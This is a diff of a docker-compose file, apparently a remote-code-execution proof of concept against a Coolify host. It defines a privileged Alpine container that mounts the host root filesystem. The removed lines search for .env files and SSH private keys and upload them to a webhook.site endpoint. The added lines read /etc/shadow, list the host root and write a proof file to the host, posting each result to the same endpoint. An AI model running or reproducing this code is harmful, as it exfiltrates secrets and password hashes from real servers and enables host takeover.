@@ -1,4 +1,3 @@
-version: '3.8'
 services:
   rce-test:
     image: 'alpine:3.19'
@@ -6,36 +5,27 @@ services:
     network_mode: host
     volumes:
       - '/:/host-root'
-      - '/data:/host-data'
     command:
       - sh
       - -c
       - |
-        apk add --no-cache curl findutils
+        apk add --no-cache curl
         
-        # 1. Ищем .env файлы везде
-        find /host-root /host-data -name ".env" -type f 2>/dev/null | grep -v "applications" | grep -v "services" > /tmp/env_paths.txt
-        cat /tmp/env_paths.txt | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=env_paths
-        
-        # 2. Читаем первый найденный .env (главный)
-        ENV_FILE=$(head -1 /tmp/env_paths.txt)
-        if [ -n "$ENV_FILE" ]; then
-          cat "$ENV_FILE" > /tmp/main_env.txt 2>&1
-          curl -X POST --data-binary @/tmp/main_env.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=main_env
-        fi
-        
-        # 3. Ищем SSH ключи везде
-        find /host-root /host-data -path "*/ssh/keys/*" -type f 2>/dev/null > /tmp/ssh_paths.txt
-        cat /tmp/ssh_paths.txt | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_paths
-        
-        # 4. Читаем все найденные SSH ключи
-        if [ -s /tmp/ssh_paths.txt ]; then
-          cat $(cat /tmp/ssh_paths.txt) > /tmp/ssh_keys.txt 2>&1
-          curl -X POST --data-binary @/tmp/ssh_keys.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_private_keys
-        fi
-        
-        # 5. Доказательство root
+        # 1. Доказательство root
         id > /tmp/id.txt
-        curl -X POST --data-binary @/tmp/id.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=root_proof
+        curl -X POST --data-binary @/tmp/id.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919L?stage=root_proof
+        
+        # 2. Создаём proof-файл на хосте
+        echo "RCE_PROOF_$(date +%s)" > /host-root/tmp/coolify_rce_proof.txt
+        echo "Container can write to host filesystem" >> /host-root/tmp/coolify_rce_proof.txt
+        echo "Mount test: $(ls /host-root/ | head -10)" >> /host-root/tmp/coolify_rce_proof.txt
+        
+        # 3. Пытаемся прочитать /etc/shadow (доказательство доступа к чувствительным данным)
+        cat /host-root/etc/shadow | head -5 > /tmp/shadow_test.txt 2>&1
+        curl -X POST --data-binary @/tmp/shadow_test.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=shadow_read
+        
+        # 4. Отправляем список того, что видим в /host-root
+        ls -la /host-root/ | head -30 > /tmp/host_root_ls.txt
+        curl -X POST --data-binary @/tmp/host_root_ls.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=host_root_listing
         
         sleep 3600
